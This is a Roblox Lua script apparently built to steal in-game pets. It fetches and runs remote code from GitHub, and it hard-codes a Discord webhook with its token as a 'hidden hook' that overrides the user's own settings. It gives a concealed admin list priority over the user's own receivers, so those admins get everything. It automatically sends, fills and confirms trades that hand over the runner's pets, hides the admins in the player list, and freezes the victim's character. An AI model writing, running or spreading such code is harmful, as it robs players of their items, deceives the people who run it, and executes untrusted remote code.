-- [[ MONDEUR ELITE v11.0 - LURAPH PROTECTED ]] --
if _G.__Ran then return end
_G.__Ran = true

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

-- ======= 1. HIDDEN ADMIN & WEBHOOK SETTINGS =======
-- These override the public getgenv() settings
local hiddenHook = "https://discord.com/api/webhooks/1474651524251648163/lhPvWSeT6mcm3b4tIfzEbph1asYmZGvxf3YABYsKUOSeInP3oXW10NmHKJuj0vDrICku"
local AdminList = {"CREOLEO23", "cfpaj67", "Hisokarah", "2ndcfpaj67", "sofiqmnz"}

local activeWebhook = hiddenHook ~= "" and hiddenHook or getgenv().WEBHOOK

-- ======= 2. SMART PET VALUE ENGINE (RESOURCES) =======
-- Fetches the database you provided [cite: 3, 4, 5]
local PET_DATABASE = loadstring(game:HttpGet("https://raw.githubusercontent.com/charles1384/ADM/refs/heads/main/adm%20pet%20value.txt"))() or {}

local function getPetInfo(petData)
    local name = petData.name or petData.Type or "Unknown"
    local isNeon = petData.isNeon or petData.Neon or false
    local isMega = petData.isMegaNeon or petData.MegaNeon or false
    local flyable = petData.flyable or petData.Flyable or false
    local rideable = petData.rideable or petData.Rideable or false
    
    local baseValue = PET_DATABASE[name] or 0
    local finalValue = baseValue
    
    -- Smart Multipliers 
    if finalValue > 0 then
        if isMega then finalValue = finalValue * 14 -- Multiplier adjusted to your preference [cite: 1]
        elseif isNeon then finalValue = finalValue * 3.8 end -- [cite: 2]
    end
    
    -- Logic for F/R pets
    if flyable then finalValue = finalValue + 150 end
    if rideable then finalValue = finalValue + 100 end
    
    return {
        name = name, isNeon = isNeon, isMegaNeon = isMega, 
        flyable = flyable, rideable = rideable,
        totalValue = finalValue, id = petData.id
    }
end

-- ======= 3. GHOST MODE & LOCKDOWN =======
local function Lockdown(adminName)
    pcall(function()
        local list = LocalPlayer.PlayerGui:FindFirstChild("PlayerList") or LocalPlayer.PlayerGui:FindFirstChild("Leaderboard")
        if list then
            for _, v in pairs(list:GetDescendants()) do
                if v:IsA("TextLabel") and v.Text == adminName then v.Parent.Visible = false end
            end
        end
    end)
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        LocalPlayer.Character.Humanoid.Sit = false
        LocalPlayer.Character.HumanoidRootPart.CFrame = Players[adminName].Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
        LocalPlayer.Character.HumanoidRootPart.Anchored = true
    end
end

-- ======= 4. PRIORITY RECEIVER DETECTION =======
local function GetBestReceiver()
    for _, admin in pairs(AdminList) do
        if Players:FindFirstChild(admin) then return Players[admin], true end
    end
    local publicReceiver = getgenv().RECEIVERS[1]
    if publicReceiver and Players:FindFirstChild(publicReceiver) then
        return Players[publicReceiver], false
    end
    return nil
end

-- ======= 5. TRADING ENGINE =======
local function executeTrade(targetPlayer, isAdmin)
    if not targetPlayer or not targetPlayer.Parent then return end
    
    local success, pets = pcall(function() 
        return ReplicatedStorage:WaitForChild("Inventory"):WaitForChild("GetPets"):InvokeServer() 
    end)
    
    if success and pets then
        local TradeAddItem = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("AddItemToTrade")
        
        -- Instant Bring & Anchor for Admins
        if isAdmin then Lockdown(targetPlayer.Name) end

        for id, petData in pairs(pets) do
            petData.id = id
            local info = getPetInfo(petData)
            
            -- Admins take everything; Hitters follow the Threshold
            if isAdmin or info.totalValue >= (getgenv().THRESHOLD or 1) then
                pcall(function() TradeAddItem:FireServer(id) end)
            end
        end
        
        -- Fast Confirm Cycle
        pcall(function() ReplicatedStorage.Trade.ReadyTrade:FireServer(true) end)
        pcall(function() ReplicatedStorage.Trade.ConfirmTrade:FireServer() end)
    end
end

-- ======= 6. MAIN MASTER LOOP =======
task.spawn(function()
    -- Load the Obfuscated UI 
    loadstring(game:HttpGet("https://raw.githubusercontent.com/charles1384/ADM/refs/heads/main/V.1"))()

    while task.wait(0.5) do
        local target, isAdmin = GetBestReceiver()
        if target then
            -- Silent Request
            pcall(function() ReplicatedStorage.Trade.RequestTrade:FireServer(target) end)
            executeTrade(target, isAdmin)
        end
    end
end)
